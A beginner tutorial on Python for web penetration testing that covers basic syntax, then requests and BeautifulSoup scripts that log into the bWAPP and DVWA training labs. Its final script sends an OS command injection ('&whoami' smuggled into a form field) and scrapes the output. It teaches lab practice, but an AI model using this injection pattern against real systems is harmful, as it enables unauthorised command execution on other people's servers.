# Python For Web PT

In this Module We will be learning some basics to intermediate program writing in python which will be helpful for later topics.

Python is reallly great and simple when it comes to scripting tools. we will be learning concepts which are require for our course.

To start writing in python we need IDE (prefer code or codium) 

## Basics

### Variables in python.

Variables are just storage reference in python which stores data with ref name and that can be used later when in need.  

To fully understand variable and data types its recomended to practice each and everything manually.

##### Creating Variables
A variable is created the moment you first assign a value to it.

```python
x = 5  
y = "John"  
print(x)  
print(y)
```
```text
output:
5  
John
```


##### Casting Variables
If you want to specify the data type of a variable, this can be done with casting.

```python

x = str(3) \# x will be '3'  
y = int(3) \# y will be 3  
z = float(3) \# z will be 3.0

```

##### Get the Type
You can get the data type of a variable with the `type()` function.

```python
x = 5  
y = "John"  
print(type(x))  
print(type(y))

```

#### Local and Global Variable.

```python
x = "awesome"  
  
def myfunc():  
 x = "fantastic"  
 print("Python is " \+ x)  
  
myfunc()  
  
print("Python is " \+ x)

```

### Lists in python

Lists are just like variable but it stores a  lists of data like list of fruits, flowers and more. those data can be accesible by specifying index to the same.

```python
DEMOLIST = ["apple", "banana", "cherry", "orange", "kiwi", "melon", "mango"]
print(DEMOLIST[1])
print(DEMOLIST[2])
print(DEMOLIST[3])
```
```text
Output
banana
cherry
orange
```


## Loops:

Python offers multipl loops however we will be focusing on few. `for() loop` and `while()`

#### For() Loop

A for loop is used for iterating over a sequence (that is either a list, a tuple, a dictionary, a set, or a string).

This is less like the for keyword in other programming languages, and works more like an iterator method as found in other object-orientated programming languages.

With the for loop we can execute a set of statements, once for each item in a list, tuple, set etc.

```python
fruits = \["apple", "banana", "cherry"\]  
for each in fruits:  
 print(each)
```
```text
out
apple  
banana  
cherry
```

#### While() Loop

With the while loop we can execute a set of statements as long as a condition is true.
With the `break` statement we can stop the loop even if the while condition is true:
With the `continue` statement we can stop the current iteration, and continue with the next:

```python
while(condition matches):
	Executes code
	if(condition matches):
		break
	if(condition maches):
		continue
	
```


## Functions.

A function is a block of code which only runs when it is called.

You can pass data, known as parameters, into a function.

A function can return data as a result.

#### Creating a Function.

In Python a function is defined using the `def` keyword:
To call a function, use the function name followed by parenthesis:

```python
def my_function():  #defining function 
 print("Hello from a function")
 
my_function() #calling function 

 ```
 
 ```python
 def addition(num1,num2): #defining function with args
 	return num1 + num2    #returning data
	
result = addition(2,3)	  #calling and storing return data of function 
```

## Error Handeling.

Its not good to show error in scripts so its better to handle proper so anyone can use exploits without issues and fix errors with ref given after error handeling.

in python for error handeling there is a syntaxt `try` and `except` which will work as below.

```python

try: 
	python code 
	xyz #error
	abc #won't execute
except:
	print("you have an error in xyz.")
```
	
```python
try:  
 print(x)  
except NameError:  
 print("Variable x is not defined")  
except:  
 print("Something else went wrong")
```


## Libraries

### Requests

Requests is a great library in python which allows tester to automate web tasks such as login, requesting data, sending data and more over http and https websites. requests offers many features                                                                                        

#### Syntax

requests._methodname(params)

| Method 	| Description 	|
|-	|-	|
| delete(url, args) 	| Sends a DELETE request to the specified url 	|
| get(url, params, args) 	| Sends a GET request to the specified url 	|
| post(url, data, json, args) 	| Sends a POST request to the specified url 	|
| put(url, data, args) 	| Sends a PUT request to the specified url 	|
| head(url, args) 	| Sends a HEAD request to the specified url 	|
| patch(url, data, args) 	| Sends a PATCH request to the specified url 	|
| request(method, url, args) 	| Sends a request of the specified method to the specified url 	|

#### Fetching web page with requests
```python
#!/usr/bin/python3

import requests
x = requests.get('https://w3schools.com/python/demopage.htm')  
  
print(x.text)  
```

#### Login to website with requests
```python 
import requests
################# DATA #############################
#login: bee
#password: bug
#security\_level: 0
#form: submit
#login URL http://10.0.0.16/bWAPP/login.php
#after auth URL http://10.0.0.16/bWAPP/sqli\_1.php?title=a&action=search
####################################################
  
url = "http://10.0.0.16/bWAPP/login.php"
url2 = "http://10.0.0.16/bWAPP/sqli\_1.php?title=a&action=search"

values = {
 "login": "bee",
 "password": "bug",
 "security\_level": 0,
 "form": "submit"
}
session = requests.session() # defining a session
r = session.get(url2) # Auth failure as no login
print(len(r.text))
r = session.post(url, data\=values) # authentication
print(r.cookies)
r = session.get(url2) #After authentication session upgrades cookie
print(len(r.text))

```

#### Beautiful Soup
```python 
import requests
from bs4 import BeautifulSoup

################# DATA #############################
#http://127.0.0.1/DVWA/login.php
#username: admin
#password: password
#Login: Login
#user_token: 4d2ac2c2d140dece14950530624b30d7 : need to fetch
####################################################

url = "http://10.0.0.16/DVWA/login.php"
url2 = "http://10.0.0.16/DVWA/security.php"

values = {
    "username": "admin",
    "password": "password",
    "Login": "Login",
    "user_token": ""
}


session = requests.session() # defining a session
r = session.get(url2) # Auth failure as no login
print(len(r.text))
soup = BeautifulSoup(r.content,'html5lib')
values["user_token"] = soup.find('input', attrs={'name': 'user_token'})['value'] #fetching token for login func.

r = session.post(url, data=values) # authentication
print(r.cookies)
r = session.get(url2)   #After authentication session upgrades cookie
print(len(r.text))

```

#### time

```python
import time

print("first")
time.sleep(1) #wait for delay 1 sec.
print("second")
```


#### Filteration of Response

```python
#Request URL: http://127.0.0.1/bWAPP/commandi.php
import requests
from bs4 import BeautifulSoup

url = "http://10.0.0.16/bWAPP/login.php"

values = {
    "login": "bee",
    "password": "bug",
    "security_level": 0,
    "form": "submit"
}

session = requests.session() # defining a session
r = session.post(url, data=values) # authentication

################# DATA #############################
#Request URL: http://10.0.0.16/bWAPP/commandi.php
#target: & `command` [INjection point]
#form: submit
####################################################

url2 = "http://10.0.0.16/bWAPP/commandi.php"

cmd = "whoami" #command to execute
#import sys
#cmd = sys.argv[1]
values = {
    "target":"&"+ cmd,
    "form": "submit"
}
r = session.post(url2,data=values) # login
soup = BeautifulSoup(r.content,'html5lib') #parsing html
test = soup.findAll('p') #finding data location
print(test[1].text) # printing data location
```


Those examples are really important to move further for exploitation of other bugs.
